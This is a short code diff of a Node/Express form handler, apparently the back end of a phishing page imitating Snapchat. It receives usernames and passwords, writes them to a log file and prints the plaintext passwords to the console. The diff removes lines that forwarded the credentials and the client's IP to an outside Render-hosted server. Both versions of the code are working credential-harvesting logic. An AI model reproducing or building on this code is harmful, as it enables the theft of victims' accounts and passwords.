@@ -24,24 +24,13 @@ app.post('/submit', async (req, res) => {
       password: password
     };
 
-    const renderResponse = await fetch('https://snapchat-35f2.onrender.com/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: username,
-        password: password,
-        clientIp: clientIp
-      })
-    });
-
-    if (!renderResponse.ok) throw new Error('Render antwortete mit Fehler');
-
     fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
       if (err) console.error("Log-Fehler:", err);
     });
 
     console.log("👤 Benutzername erhalten:", username);
     console.log("🔑 Passwort erhalten:", password);
+
     res.redirect('/danke.html');
 
   } catch (error) {
